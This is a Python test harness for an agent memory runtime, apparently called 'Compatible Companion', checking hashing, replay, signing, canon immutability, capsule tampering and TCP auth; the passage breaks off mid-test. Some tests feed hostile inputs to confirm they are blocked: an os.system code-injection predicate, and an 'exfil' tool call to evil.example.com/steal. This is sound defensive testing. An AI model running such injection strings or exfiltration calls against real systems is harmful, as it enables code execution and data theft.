#!/usr/bin/env python3
"""
stress_harness.py — Adversarial isolation harness for Compatible Companion.

Runs every test in a clean subprocess (no shared state, no pytest pipeline).
Injects corruption for every test that claims to detect it.
Reports PASS / FAIL / CORRUPT_CAUGHT / CORRUPT_MISSED independently.

Usage:
    cd ~/compatible
    python3 stress_harness.py

Exit code 0 = all clean. Non-zero = something is wrong.
"""

import os
import sys
import json
import subprocess
import tempfile
import textwrap
from pathlib import Path

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def ok(msg):     print(f"  {GREEN}✓ PASS{RESET}  {msg}")
def fail(msg):   print(f"  {RED}✗ FAIL{RESET}  {msg}")
def caught(msg): print(f"  {GREEN}✓ CORRUPT_CAUGHT{RESET}  {msg}")
def missed(msg): print(f"  {RED}✗ CORRUPT_MISSED{RESET}  {msg}")
def info(msg):   print(f"  {CYAN}→{RESET} {msg}")
def section(s):  print(f"\n{BOLD}{CYAN}{'─'*60}{RESET}\n{BOLD}{s}{RESET}")

# Locate project root
PROJECT_ROOT = Path(__file__).resolve().parent
for p in [PROJECT_ROOT] + list(PROJECT_ROOT.parents):
    if (p / "cc" / "runtime.py").exists():
        PROJECT_ROOT = p
        break

results = []

def run_isolated(code, expect_exit_zero=True):
    with tempfile.NamedTemporaryFile(suffix=".py", mode="w", delete=False) as f:
        f.write(code)
        tmp = f.name
    try:
        r = subprocess.run(
            [sys.executable, tmp],
            capture_output=True, text=True,
            env={**os.environ, "PYTHONPATH": str(PROJECT_ROOT)},
            timeout=15,
        )
        out = r.stdout + r.stderr
        success = (r.returncode == 0) == expect_exit_zero
        return success, out
    except subprocess.TimeoutExpired:
        return False, "TIMEOUT"
    finally:
        os.unlink(tmp)

def record(name, passed, detail=""):
    results.append((name, passed, detail))
    if passed:
        ok(name)
    else:
        fail(name)
        for line in detail.strip().splitlines()[-6:]:
            print(f"    {YELLOW}{line}{RESET}")

def record_corruption(name, caught_it, detail=""):
    results.append((name + " [corruption]", caught_it, detail))
    if caught_it:
        caught(name)
    else:
        missed(name)
        for line in detail.strip().splitlines()[-6:]:
            print(f"    {YELLOW}{line}{RESET}")

def record_deferred(name, reason):
    results.append((name, None, reason))
    print(f"  {YELLOW}⊘ DEFERRED{RESET}  {name}")
    print(f"      {CYAN}({reason}){RESET}")

# ─────────────────────────────────────────────────────────────────────────────
KEY_SETUP = textwrap.dedent("""
import json, os, shutil
from cc.identity import generate_keypair, KeyManager

def _make_key(tmp):
    sk_b64, vk_b64 = generate_keypair()
    src = os.path.join(os.getcwd(), 'cc_identity.key')
    dst = os.path.join(tmp, 'id.key')
    shutil.copy2(src, dst)
    os.chmod(dst, 0o600)
    km = KeyManager(dst)
    return km, vk_b64, dst
""")

ZW_BLOCK = "{'block_type': 'mem', 'meta': {'scope': 'core'}, 'body_lines': ['Hello world']}"
ZW_BLOCK2 = "{'block_type': 'mem', 'meta': {'scope': 'core'}, 'body_lines': ['Different input']}"
ZW_BLOCK_SPACE = "{'block_type': 'mem', 'meta': {'scope': 'core'}, 'body_lines': ['Hello world ']}"


# ══════════════════════════════════════════════════════════════════════════════
section("1 · ZW Block Canonicalization")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent(f"""
from cc.zw_block import canonical_bytes
p1 = {ZW_BLOCK}
p2 = {ZW_BLOCK}
p3 = {ZW_BLOCK2}
_, h1 = canonical_bytes(p1)
_, h2 = canonical_bytes(p2)
_, h3 = canonical_bytes(p3)
assert h1 == h2, f"same input must hash identically: {{h1}} != {{h2}}"
assert len(h1) == 64, f"SHA3-256 must be 64 hex chars, got {{len(h1)}}"
assert h1 != h3, "different body_lines must produce different hash"
print("OK")
""")
ok_, out = run_isolated(code)
record("ZW canonical_bytes: deterministic SHA3-256, unique per content", ok_ and "OK" in out, out)

code = textwrap.dedent(f"""
from cc.zw_block import canonical_bytes
p1 = {ZW_BLOCK}
p2 = {ZW_BLOCK_SPACE}
_, h1 = canonical_bytes(p1)
_, h2 = canonical_bytes(p2)
if h1 == h2:
    print("NORMALISED")
else:
    print("NOT_NORMALISED")
""")
ok_, out = run_isolated(code)
record("ZW canonical_bytes: trailing space in body_line normalised out (per spec)",
       ok_ and "NORMALISED" in out, out)

code = textwrap.dedent(f"""
from cc.zw_block import canonical_bytes
p1 = {{'block_type': 'mem', 'meta': {{'scope': 'core'}}, 'body_lines': ['same']}}
p2 = {{'block_type': 'mem', 'meta': {{'scope': 'style'}}, 'body_lines': ['same']}}
_, h1 = canonical_bytes(p1)
_, h2 = canonical_bytes(p2)
assert h1 != h2, "different meta must produce different hash"
print("OK")
""")
ok_, out = run_isolated(code)
record("ZW canonical_bytes: different meta values produce different hash", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("2 · State Machine — Full Cycle COMMIT")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"))
    res = rt.run_cycle(
        plan={"action":"mem_store","unit_id":"u1","scope":"core", "tags":[],"body":{"summary":"test"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    assert res == "COMMIT", f"expected COMMIT got {res}"
    units = rt.memory.mem_find(scope="core")
    assert any(u.get("unit_id")=="u1" for u in units), f"unit missing: {units}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Full cycle COMMIT promotes unit to committed storage", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("3 · Verify Failure — Staged Writes Discarded")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os, json
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"))
    r1 = rt.run_cycle(
        plan={"action":"mem_store","unit_id":"c1","scope":"canon", "tags":[],"body":{"summary":"locked"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    assert r1 == "COMMIT", f"first canon write: {r1}"
    r2 = rt.run_cycle(
        plan={"action":"mem_store","unit_id":"c1","scope":"canon", "tags":[],"body":{"summary":"overwrite attempt"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    assert r2 == "FAIL", f"second canon write must FAIL: {r2}"
    units = rt.memory.mem_find(scope="canon")
    c = next((u for u in units if u.get("unit_id")=="c1"), None)
    assert c, "original canon unit must still exist"
    body = c.get("body",{})
    if isinstance(body, str): body = json.loads(body)
    assert body.get("summary")=="locked", f"canon body mutated: {body}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("VERIFY FAIL (canon): staged writes discarded, original intact", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("4 · Deterministic Replay")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    log = os.path.join(tmp, "r.jsonl")
    rt1 = AgentRuntime(db_path=os.path.join(tmp,"s1.db"), log_path=log)
    rt1.run_cycle(
        plan={"action":"mem_store","unit_id":"u1","scope":"core", "tags":[],"body":{"summary":"Alice"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    h1 = rt1.last_state_hash
    rt2 = AgentRuntime(db_path=os.path.join(tmp,"s2.db"), log_path=os.path.join(tmp,"r2.jsonl"))
    rt2.replay_log(log)
    h2 = rt2.last_state_hash
    assert h1 == h2, f"replay mismatch:\\n  original: {h1}\\n  replayed: {h2}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Deterministic replay: fresh runtime reaches same state_hash", ok_ and "OK" in out, out)

info("Injecting: single-byte corruption in receipt log")
code = textwrap.dedent(r"""
import tempfile, os, re
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    log = os.path.join(tmp, "r.jsonl")
    rt1 = AgentRuntime(db_path=os.path.join(tmp,"s1.db"), log_path=log)
    rt1.run_cycle(
        plan={"action":"mem_store","unit_id":"u1","scope":"core", "tags":[],"body":{"summary":"Alice"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    with open(log) as f:
        content = f.read()
    corrupted = re.sub(
        r'("prev_receipt_hash":\s*"sha256:[a-f0-9]{4})',
        lambda m: m.group(0)[:-1] + ("0" if m.group(0)[-1] != "0" else "1"),
        content, count=1
    )
    with open(log, "w") as f:
        f.write(corrupted)
    rt2 = AgentRuntime(db_path=os.path.join(tmp,"s2.db"), log_path=os.path.join(tmp,"r2.jsonl"))
    try:
        rt2.replay_log(log)
        print("MISSED")
    except Exception as e:
        msg = str(e).lower()
        print("CAUGHT" if any(w in msg for w in ["chain","break","mismatch","corrupt","invalid"]) else f"WRONG_ERROR:{e}")
""")
ok_, out = run_isolated(code)
record_corruption("Receipt log: single-byte corruption detected on replay", "CAUGHT" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("5 · Ed25519 Signing")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
from cc.identity import generate_keypair
sk, vk = generate_keypair()
assert sk and vk, "keypair must not be empty"
assert isinstance(sk, str) and isinstance(vk, str), "keys must be b64 strings"
print("OK")
""")
ok_, out = run_isolated(code)
record("generate_keypair(): returns (sk_b64, vk_b64)", ok_ and "OK" in out, out)

code = KEY_SETUP + textwrap.dedent("""
import tempfile
with tempfile.TemporaryDirectory() as tmp:
    km, vk_b64, kp = _make_key(tmp)
    payload = b"determinism check"
    s1 = km.sign(payload)
    s2 = km.sign(payload)
    assert s1 == s2, f"sign must be deterministic: {s1} != {s2}"
    assert isinstance(s1, str), "sig must be a b64 string"
    print("OK")
""")
ok_, out = run_isolated(code)
record("KeyManager.sign: deterministic within session", ok_ and "OK" in out, out)

info("Injecting: payload tampered after signing")
code = KEY_SETUP + textwrap.dedent("""
import tempfile
import nacl.exceptions
from cc.identity import verify_payload
with tempfile.TemporaryDirectory() as tmp:
    km, vk_b64, kp = _make_key(tmp)
    payload  = b"original"
    sig_b64  = km.sign(payload)
    tampered = b"tampered"
    try:
        verify_payload(tampered, sig_b64, vk_b64)
        print("MISSED")
    except Exception:
        print("CAUGHT")
""")
ok_, out = run_isolated(code)
record_corruption("Ed25519: tampered payload rejected by verify_payload", "CAUGHT" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("6 · KeyManager: Session-Resident + Zero on Close")
# ══════════════════════════════════════════════════════════════════════════════

code = KEY_SETUP + textwrap.dedent("""
import tempfile
with tempfile.TemporaryDirectory() as tmp:
    km, vk_b64, kp = _make_key(tmp)
    s1 = km.sign(b"data")
    s2 = km.sign(b"data")
    assert s1 == s2, "sign must be deterministic before close"
    km.close()
    try:
        km.sign(b"data")
        print("ZERO_FAILED")
    except RuntimeError:
        print("ZERO_OK")
    except Exception as e:
        print(f"WRONG_EXCEPTION:{type(e).__name__}")
""")
ok_, out = run_isolated(code)
record("KeyManager: sign() raises RuntimeError after close() (key zeroed)", ok_ and "ZERO_OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("7 · TTL: Expired Unit Invisible")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os
from datetime import datetime, timezone, timedelta
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"))
    expired = (datetime.now(timezone.utc) - timedelta(seconds=1)).isoformat()
    rt.run_cycle(
        plan={"action":"mem_store","unit_id":"u_ttl","scope":"style", "tags":[],"body":{"summary":"ephemeral"}, "ttl_expires_at": expired},
        act_fn=lambda p: {**p}, invariants=[],
    )
    units = rt.memory.mem_find(scope="style")
    assert not any(u.get("unit_id")=="u_ttl" for u in units), f"expired unit must be invisible, got: {units}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("TTL: past ttl_expires_at → invisible to mem_find", ok_ and "OK" in out, out)

info("Verifying: expired unit tombstoned in DB (provenance preserved)")
code = textwrap.dedent("""
import tempfile, os, sqlite3
from datetime import datetime, timezone, timedelta
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    db = os.path.join(tmp,"t.db")
    rt = AgentRuntime(db_path=db, log_path=os.path.join(tmp,"r.jsonl"))
    expired = (datetime.now(timezone.utc) - timedelta(seconds=1)).isoformat()
    rt.run_cycle(
        plan={"action":"mem_store","unit_id":"u_ttl","scope":"style", "tags":[],"body":{"summary":"ephemeral"}, "ttl_expires_at": expired},
        act_fn=lambda p: {**p}, invariants=[],
    )
    conn = sqlite3.connect(db)
    cols = [r[1] for r in conn.execute("PRAGMA table_info(units)").fetchall()]
    id_col = "unit_id" if "unit_id" in cols else "id"
    rows = conn.execute(f"SELECT {id_col} FROM units WHERE {id_col}='u_ttl'").fetchall()
    conn.close()
    print("TOMBSTONED" if rows else "HARD_DELETED")
""")
ok_, out = run_isolated(code)
if "TOMBSTONED" in out:
    ok("TTL: expired unit tombstoned in DB (provenance preserved)")
    results.append(("TTL tombstone preservation", True, ""))
elif "HARD_DELETED" in out:
    info("TTL: expired unit hard-deleted — provenance trail lost, flag for spec review")
    results.append(("TTL tombstone preservation", False, "hard delete loses provenance"))
else:
    fail("TTL tombstone: unexpected output")
    results.append(("TTL tombstone preservation", False, out))


# ══════════════════════════════════════════════════════════════════════════════
section("8 · Canon Immutability")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os, json
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"))
    r1 = rt.run_cycle(
        plan={"action":"mem_store","unit_id":"c1","scope":"canon", "tags":[],"body":{"summary":"truth"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    assert r1 == "COMMIT", f"first canon write: {r1}"
    r2 = rt.run_cycle(
        plan={"action":"mem_store","unit_id":"c1","scope":"canon", "tags":[],"body":{"summary":"lie"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    assert r2 == "FAIL", f"second canon write must FAIL: {r2}"
    units = rt.memory.mem_find(scope="canon")
    c = next((u for u in units if u.get("unit_id")=="c1"), None)
    assert c, "canon unit must exist after blocked write"
    body = c.get("body",{})
    if isinstance(body, str): body = json.loads(body)
    assert body.get("summary")=="truth", f"canon body mutated: {body}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Canon immutability: second write blocked, original preserved", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("9 · AST Whitelist — Five Injection Vectors")
# ══════════════════════════════════════════════════════════════════════════════

ctx_str = '{"scope":"core","tags":["t"],"body_hash":"abc","content_type":"plain","entities":[]}'

for label, predicate, should_raise in [
    ("__class__.__mro__",          "__class__.__mro__",                      True),
    ("__import__ call",            "__import__('os').system('echo pwned')",   True),
    ("list comprehension",         "[x for x in []]",                        True),
    ("attribute chain on var",     "scope.__class__.__name__",               True),
    ("safe predicate (must pass)", "scope == 'core'",                        False),
]:
    code = textwrap.dedent(f"""
from cc.policy import eval_policy_predicate
ctx = {ctx_str}
try:
    result = eval_policy_predicate({repr(predicate)}, ctx)
    print("NO_RAISE:" + str(result))
except Exception as e:
    print("RAISED:" + type(e).__name__)
""")
    ok_, out = run_isolated(code)
    if not should_raise:
        passed = ok_ and "NO_RAISE:True" in out
        record(f"AST safe predicate evaluates correctly: {repr(predicate)}", passed, out)
    else:
        raised = "RAISED:" in out
        record_corruption(f"AST blocks: {label}", raised, out)


# ══════════════════════════════════════════════════════════════════════════════
section("10 · Tool Gateway: Allowlist Enforcement")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
from cc.tools import ToolGateway, ToolGatewayError
gw = ToolGateway(["api.example.com"])
try:
    gw.call("exfil", "evil.example.com", "/steal")
    print("MISSED")
except ToolGatewayError as e:
    r = e.receipt
    assert r["allowed"] is False,           f"allowed must be False: {r}"
    assert r["network_call_made"] is False,  f"no bytes must leave process: {r}"
    print("CAUGHT")
""")
ok_, out = run_isolated(code)
record_corruption("Tool gateway: disallowed host blocked before network I/O", "CAUGHT" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("11 · Verifier: Independent of Gateway")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"), tool_allowlist=["api.example.com"])
    def evil_act(plan):
        return {"tool_receipts": [{
            "tool_name":"exfil","host":"evil.example.com", "path":"/steal","method":"POST",
            "allowed":True,"network_call_made":True, "status_code":200,"response_body":"stolen",
            "ts":"2026-01-01T00:00:00","error":None,
        }]}
    res = rt.run_cycle(plan={"action":"tool_call","tool":"exfil"}, act_fn=evil_act, invariants=[])
    assert res == "FAIL", f"Verifier must catch gateway bypass: {res}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Verifier: unauthorized call caught even when gateway bypassed", ok_ and "OK" in out, out)

info("Verifying: staged unit discarded atomically on FAIL")
code = textwrap.dedent("""
import tempfile, os
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"), tool_allowlist=["api.example.com"])
    def evil_act(plan):
        return {
            "tool_receipts": [{
                "tool_name":"exfil","host":"evil.example.com", "path":"/steal","method":"POST",
                "allowed":True,"network_call_made":True, "status_code":200,"response_body":"stolen",
                "ts":"2026-01-01T00:00:00","error":None,
            }],
            "action":"mem_store","unit_id":"u_bad","scope":"style", "tags":[],"body":{"summary":"must not persist"},
        }
    res = rt.run_cycle(
        plan={"action":"mem_store","unit_id":"u_bad","scope":"style", "tags":[],"body":{"summary":"must not persist"}},
        act_fn=evil_act, invariants=[],
    )
    assert res == "FAIL"
    units = rt.memory.mem_find(scope="style")
    assert not any(u.get("unit_id")=="u_bad" for u in units), "staged unit must be discarded on FAIL"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Verifier FAIL: staged unit writes atomically discarded", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("12 · Capsule Export/Import Roundtrip")
# ══════════════════════════════════════════════════════════════════════════════

code = KEY_SETUP + textwrap.dedent("""
import tempfile, os, json
from cc.runtime import AgentRuntime
from cc.capsule import export_capsule, import_capsule

with tempfile.TemporaryDirectory() as tmp:
    km, vk_b64, kp = _make_key(tmp)
    db1  = os.path.join(tmp,"s1.db")
    rt1 = AgentRuntime(db_path=db1, log_path=os.path.join(tmp,"r1.jsonl"))
    rt1.run_cycle(
        plan={"action":"mem_store","unit_id":"u1","scope":"core", "tags":[],"body":{"summary":"portable"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    caps_path = os.path.join(tmp,"caps.json")
    export_capsule(db1, caps_path, key_manager=km)
    
    db2 = os.path.join(tmp,"s2.db")
    import_capsule(caps_path, db2, key_manager=km)

    rt2 = AgentRuntime(db_path=db2, log_path=os.path.join(tmp,"r2.jsonl"))
    units = rt2.memory.mem_find(scope="core")
    assert any(u.get("unit_id")=="u1" for u in units), "unit missing after import"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Capsule roundtrip: unit survives export → import (signed)", ok_ and "OK" in out, out)

info("Injecting: single-character tamper in signed capsule signature")
code = KEY_SETUP + textwrap.dedent("""
import tempfile, os, json
from cc.runtime import AgentRuntime
from cc.capsule import export_capsule, import_capsule

with tempfile.TemporaryDirectory() as tmp:
    km, vk_b64, kp = _make_key(tmp)
    db1 = os.path.join(tmp,"s1.db")
    rt1 = AgentRuntime(db_path=db1)
    rt1.run_cycle(plan={"action":"mem_store","unit_id":"u1","scope":"core","body":{"s":"x"}}, act_fn=lambda p:p, invariants=[])
    caps_path = os.path.join(tmp,"caps.json")
    export_capsule(db1, caps_path, key_manager=km)

    with open(caps_path) as f: caps = json.load(f)
    sig = list(caps['signature'])
    sig[0] = 'A' if sig[0] != 'A' else 'B'
    caps['signature'] = ''.join(sig)
    with open(caps_path, 'w') as f: json.dump(caps, f)

    try:
        import_capsule(caps_path, os.path.join(tmp,"s2.db"), key_manager=km)
        print("MISSED")
    except Exception as e:
        if "signature invalid" in str(e).lower():
            print("CAUGHT")
        else:
            print(f"WRONG_ERROR:{e}")
""")
ok_, out = run_isolated(code)
record_corruption("Capsule import: tampered signature rejected", "CAUGHT" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("13 · Conflict Resolution: keep_local")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os, json
from cc.runtime import AgentRuntime
from cc.capsule import export_capsule, import_capsule

with tempfile.TemporaryDirectory() as tmp:
    db_local  = os.path.join(tmp,"local.db")
    db_remote = os.path.join(tmp,"remote.db")
    caps_path = os.path.join(tmp,"caps.json")

    rt_local = AgentRuntime(db_path=db_local, log_path=os.path.join(tmp,"local.jsonl"))
    rt_local.run_cycle(
        plan={"action":"mem_store","unit_id":"u1","scope":"core", "tags":[],"body":{"summary":"local version"}},
        act_fn=lambda p: {**p}, invariants=[],
    )

    rt_remote = AgentRuntime(db_path=db_remote, log_path=os.path.join(tmp,"remote.jsonl"))
    rt_remote.run_cycle(
        plan={"action":"mem_store","unit_id":"u1","scope":"core", "tags":[],"body":{"summary":"remote version"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    export_capsule(db_remote, caps_path)

    try:
        import_capsule(caps_path, db_local, conflict_strategy="keep_local")
    except Exception:
        pass

    rt_local2 = AgentRuntime(db_path=db_local, log_path=os.path.join(tmp,"local2.jsonl"))
    units = rt_local2.memory.mem_find(scope="core")
    u = next((u for u in units if u.get("unit_id")=="u1"), None)
    assert u, "u1 missing after import"
    body = u.get("body",{})
    if isinstance(body, str): body = json.loads(body)
    assert body.get("summary")=="local version", f"keep_local failed: {body}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Conflict keep_local: local unit body preserved after import", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("14 · MCP Adapter: mem_find and mem_store")
# build_server returns (server, handlers_dict)
# ══════════════════════════════════════════════════════════════════════════════

code = KEY_SETUP + textwrap.dedent("""
import tempfile, os, asyncio, json
from cc.runtime import AgentRuntime
from cc.mcp_adapter import build_server

async def run():
    with tempfile.TemporaryDirectory() as tmp:
        km, vk_b64, kp = _make_key(tmp)
        rt = AgentRuntime(db_path=os.path.join(tmp,"t.db"), log_path=os.path.join(tmp,"r.jsonl"))
        rt.run_cycle(
            plan={"action":"mem_store","unit_id":"u_mcp","scope":"core", "tags":["mcp"],"body":{"summary":"mcp unit"}},
            act_fn=lambda p: {**p}, invariants=[],
        )
        
        server, handlers = build_server(rt, km)
        call_tool = handlers["mem_find"]

        res1 = await call_tool("mem_find", {"scope":"core"})
        units = json.loads(res1[0].text)
        assert any(u.get("unit_id")=="u_mcp" for u in units), f"u_mcp missing: {units}"

        call_store = handlers["mem_store"]
        res2 = await call_store("mem_store", {
            "unit_id":"u_mcp2","scope":"style", "tags":[],"body":{"summary":"via mcp"}
        })
        out = json.loads(res2[0].text)
        assert out.get("outcome")=="COMMIT", f"mem_store via MCP must COMMIT: {out}"
        print("OK")

asyncio.run(run())
""")
ok_, out = run_isolated(code)
record("MCP adapter: mem_find returns units, mem_store commits via full cycle", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("15 · Profile Write Auditable via Provenance")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os, sqlite3
from cc.runtime import AgentRuntime
with tempfile.TemporaryDirectory() as tmp:
    db = os.path.join(tmp,"t.db")
    rt = AgentRuntime(db_path=db, log_path=os.path.join(tmp,"r.jsonl"))
    rt.run_cycle(
        plan={"action":"mem_store","unit_id":"style_voice","scope":"style", "tags":["voice"],"body":{"summary":"terse, direct"}},
        act_fn=lambda p: {**p}, invariants=[],
    )
    conn = sqlite3.connect(db)
    cols = [r[1] for r in conn.execute("PRAGMA table_info(provenance)").fetchall()]
    uid_col = "unit_id" if "unit_id" in cols else "id"
    rows = conn.execute(f"SELECT {uid_col}, op FROM provenance WHERE {uid_col}='style_voice'").fetchall()
    conn.close()
    assert rows, f"provenance must record style write: {rows}"
    assert rows[0][1]=="create", f"op must be 'create', got: {rows[0][1]}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Style write recorded in provenance (persona drift auditable)", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("16 · Snapshot Checkpointing (O(N) vs O(recent))")
# ══════════════════════════════════════════════════════════════════════════════

code = textwrap.dedent("""
import tempfile, os, json
from cc.runtime import AgentRuntime
from cc.compact import compact_log, replay_from_snapshot
with tempfile.TemporaryDirectory() as tmp:
    db = os.path.join(tmp,"main.db")
    log = os.path.join(tmp,"main.jsonl")
    snap = os.path.join(tmp,"snap.json")
    
    rt = AgentRuntime(db_path=db, log_path=log)
    for i in range(5):
        rt.run_cycle(
            plan={"action":"mem_store","unit_id":f"u{i}","scope":"core","body":{"i":i}},
            act_fn=lambda p: {**p}, invariants=[],
        )
    h5 = rt.last_state_hash
    compact_log(log, snap)
    
    # Write 2 more
    for i in range(5,7):
        rt.run_cycle(
            plan={"action":"mem_store","unit_id":f"u{i}","scope":"core","body":{"i":i}},
            act_fn=lambda p: {**p}, invariants=[],
        )
    h7 = rt.last_state_hash
    
    # Replay from snapshot
    rt_s = AgentRuntime(db_path=os.path.join(tmp,"s.db"), log_path=os.path.join(tmp,"s.jsonl"))
    replay_from_snapshot(rt_s, snap, log)
    
    assert rt_s.last_state_hash == h7, f"snapshot parity fail: {rt_s.last_state_hash} != {h7}"
    print("OK")
""")
ok_, out = run_isolated(code)
record("Snapshot-Genesis Parity: replay reaches identical state_hash", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("17 · TCP Transport (Loopback mem_find)")
# ══════════════════════════════════════════════════════════════════════════════

code = KEY_SETUP + textwrap.dedent("""
import asyncio, json, tempfile, os
from cc.runtime import AgentRuntime
from cc.server import start_tcp_server

async def test():
    with tempfile.TemporaryDirectory() as tmp:
        km, vk_b64, kp = _make_key(tmp)
        db = os.path.join(tmp,"t.db")
        rt = AgentRuntime(db_path=db)
        rt.run_cycle(
            plan={"action":"mem_store","unit_id":"u_tcp","scope":"core","body":{"v":100}},
            act_fn=lambda p: {**p}, invariants=[]
        )
        
        SECRET = "test-secret"
        task = asyncio.create_task(start_tcp_server(rt, km, host='127.0.0.1', port=7706, token=SECRET))
        await asyncio.sleep(0.1) # Wait for listener
        
        try:
            reader, writer = await asyncio.open_connection('127.0.0.1', 7706)
            
            # 1. Auth
            writer.write((json.dumps({"auth": SECRET}) + "\\n").encode())
            await writer.drain()
            auth_res = json.loads((await reader.readline()).decode())
            assert auth_res['ok'] is True
            
            # 2. Tool call
            req = {"tool": "mem_find", "args": {"scope": "core"}}
            writer.write((json.dumps(req) + "\\n").encode())
            await writer.drain()
            
            res = json.loads((await reader.readline()).decode())
            assert res['ok'] is True
            assert res['result'][0]['unit_id'] == 'u_tcp'
            
            writer.close()
            await writer.wait_closed()
            print("OK")
        finally:
            task.cancel()
            try: await task
            except asyncio.CancelledError: pass
            rt.close()

asyncio.run(test())
""")
ok_, out = run_isolated(code)
record("TCP Transport: Roundtrip mem_find via newline-delimited JSON over loopback", ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("18 · Auth: Wrong Token Rejected")
# ══════════════════════════════════════════════════════════════════════════════

code = KEY_SETUP + textwrap.dedent('''
import tempfile, os, asyncio, json
from cc.runtime import AgentRuntime
from cc.server import start_tcp_server

async def run():
    with tempfile.TemporaryDirectory() as tmp:
        km, vk_b64, kp = _make_key(tmp)
        rt = AgentRuntime(db_path=os.path.join(tmp,'s.db'),
                          log_path=os.path.join(tmp,'r.jsonl'))
        task = asyncio.create_task(
            start_tcp_server(rt, km, host='127.0.0.1',
                             port=7707, token='secret'))
        await asyncio.sleep(0.1)
        r, w = await asyncio.open_connection('127.0.0.1', 7707)
        w.write((json.dumps({'auth': 'wrong'}) + '\\n').encode())
        await w.drain()
        resp = json.loads((await r.readline()).decode())
        w.close(); await w.wait_closed()
        task.cancel()
        try: await task
        except asyncio.CancelledError: pass
        rt.close()
        assert resp['ok'] is False
        assert 'unauthorized' in resp.get('error','').lower()
        print('CAUGHT')
asyncio.run(run())
''')
ok_, out = run_isolated(code)
record_corruption("Auth: wrong token rejected before any data exchange",
                  "CAUGHT" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("19 · Concurrent Session Isolation")
# ══════════════════════════════════════════════════════════════════════════════

code = KEY_SETUP + textwrap.dedent('''
import tempfile, os, asyncio, json
from cc.runtime import AgentRuntime
from cc.server import start_tcp_server

async def run():
    with tempfile.TemporaryDirectory() as tmp:
        km, vk_b64, kp = _make_key(tmp)
        rt = AgentRuntime(db_path=os.path.join(tmp,'s.db'),
                          log_path=os.path.join(tmp,'r.jsonl'))
        SECRET = 'isolation'
        task = asyncio.create_task(
            start_tcp_server(rt, km, host='127.0.0.1',
                             port=7708, token=SECRET))
        await asyncio.sleep(0.1)

        async def conn(cmds):
            r, w = await asyncio.open_connection('127.0.0.1', 7708)
            w.write((json.dumps({'auth': SECRET}) + '\\n').encode())
            await w.drain()
            await r.readline()  # discard auth resp
            results = []
            for cmd in cmds:
                w.write((json.dumps(cmd) + '\\n').encode())
                await w.drain()
